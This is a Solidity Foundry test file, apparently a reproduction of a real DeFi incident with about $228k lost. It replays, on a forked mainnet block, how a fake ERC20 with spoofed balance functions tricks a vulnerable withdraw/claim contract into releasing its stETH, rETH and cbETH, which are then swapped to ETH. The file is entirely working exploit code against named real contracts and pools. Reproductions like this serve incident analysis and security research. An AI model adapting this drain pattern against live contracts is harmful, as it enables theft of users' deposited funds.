// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~228591 USD$
// Attacker : https://etherscan.io/address/0x792ec27874e1f614e757a1ae49d00ef5b2c73959
// Attack Contract : https://etherscan.io/address/0xb2e855411f67378c08f47401eacff37461e16188
// Vulnerable Contract : https://etherscan.io/address/0xbAa87546cF87b5De1b0b52353A86792D40b8BA70
// Attack Tx : https://etherscan.io/tx/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1718454835966775325
contract MyERC20 {
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 18;
    address public stakedTokenAddr;
    uint256 public scaledBalanceToBal;

    constructor(address _stakedTokenAddress, uint256 bal) public {
        stakedTokenAddr = _stakedTokenAddress;
        scaledBalanceToBal = bal;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        allowance[sender][msg.sender] -= amount;
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    function burn(address sender, uint256 amount) external {
        balanceOf[sender] -= amount;
        totalSupply -= amount;
        emit Transfer(sender, address(0), amount);
    }

    function scaledBalanceOf(address user) external pure returns (uint256) {
        return 0;
    }

    function stakedTokenAddress() external returns (address) {
        return stakedTokenAddr;
    }

    function scaledBalanceToBalance(uint256 a) external returns (uint256) {
        return scaledBalanceToBal;
    }
}

interface Vulnerable {
    function withdraw(address _restakedTokenAddress, uint256 amount) external;
    function claim(uint256 withdrawerIndex) external;
}

interface IuniswapV3 {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external;
}

contract ASTTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Vulnerable vulnerable = Vulnerable(0xbAa87546cF87b5De1b0b52353A86792D40b8BA70);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    ICurvePool LidoCurvePool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IuniswapV3 rETHPool = IuniswapV3(0xa4e0faA58465A2D369aa21B3e42d43374c6F9613);
    IuniswapV3 cbETHPool = IuniswapV3(0x840DEEef2f115Cf50DA625F7368C24af6fE74410);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 18_448_167);
    }

    function testExpolit() public {
        address[] memory stakedTokens = new address[](3);
        stakedTokens[0] = address(stETH);
        stakedTokens[1] = address(rETH);
        stakedTokens[2] = address(cbETH);
        deal(address(this), 0);
        uint256[] memory balances = new uint[](3);
        emit log_named_decimal_uint("Attacker Eth balance before attack:", address(this).balance, 18);
        for (uint8 i = 0; i < stakedTokens.length; i++) {
            uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
            balances[i] = staked_bal;
            MyERC20 fake_token = new MyERC20(stakedTokens[i],staked_bal);
            fake_token.mint(10_000 * 1e18);
            fake_token.approve(address(vulnerable), type(uint256).max);

            vulnerable.withdraw(address(fake_token), staked_bal);
            vulnerable.claim(i);
        }

        //changing stETH to eth
        stETH.approve(address(LidoCurvePool), balances[0]);
        LidoCurvePool.exchange(1, 0, balances[0], 0);

        //changing rETH to weth
        rETH.approve(address(rETHPool), balances[1]);
        rETHPool.swap(address(this), true, int256(balances[1]), 4_295_128_740, new bytes(0));

        //changing cbETH to weth
        cbETH.approve(address(cbETHPool), balances[2]);
        cbETHPool.swap(address(this), true, int256(balances[2]), 4_295_128_740, new bytes(0));

        WETH.withdraw(WETH.balanceOf(address(this)));
        emit log_named_decimal_uint("Attacker Eth balance after attack:", address(this).balance, 18);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (amount0Delta > 0) {
            IERC20(IuniswapV3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));
        } else if (amount1Delta > 0) {
            IERC20(IuniswapV3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));
        }
    }

    receive() external payable {}
}
